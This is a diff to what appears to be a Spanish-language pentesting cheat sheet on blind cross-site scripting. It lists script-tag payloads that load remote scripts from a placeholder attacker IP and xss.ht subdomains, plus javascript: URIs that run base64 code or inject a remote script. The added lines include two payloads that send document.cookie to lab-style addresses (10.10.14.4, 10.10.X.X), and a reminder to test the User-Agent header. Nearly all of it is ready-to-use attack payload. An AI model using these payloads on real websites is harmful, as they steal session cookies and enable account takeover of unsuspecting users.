@@ -151,6 +151,8 @@ En todos los casos anteioes se da la particularidad de que no tenemos acceso par
 "><script src="https://<OUR_I P>/<custom.name>"></script>
 "><script src=//<custom.subdomain>.xss.ht></script>
 <script>$.getScript("//<custom.subdomain>.xss.ht")</script>
+<script>var i=new Image(); i.src="http://10.10.14.4/?cookie="+document.cookie;</script>
+<script>document.location="http://10.10.X.X/xss-76.js?c="+document.cookie;</script>
 #Al no poder saber si el payload funciono o no se puede referenciar un source que controlemos, de esta forma sabemos si existe o no una coneccion
 #Si queremos conocer el campo el cual es injyectable solo debemos cambiar el /script por algo que podamos diferenciar
 
@@ -198,3 +200,7 @@ javascript(eval(atob("base64string"))) -> En caso de que no funcione probar el s
 javascript:document.body.innerHTML='<script src="http://<ip>/recurso.js"></script>' -> En caso de que no funcione, probar url encodeando desde document o etc
 #Permite hacer un XSS realizando la consulta del base64 (opc 1) o con innerhtml (opc 2). En el recurso deberia estar el XSS que queremos que sea interpretado (ej. alert(XSS))
 
+[!]
+Atencion
+SIEMPRE revisar XSS en todo lo suceptible a ser mostrado para el usuario. User-Agent visible para el usuario? Probar XSS en ese header
+[!]
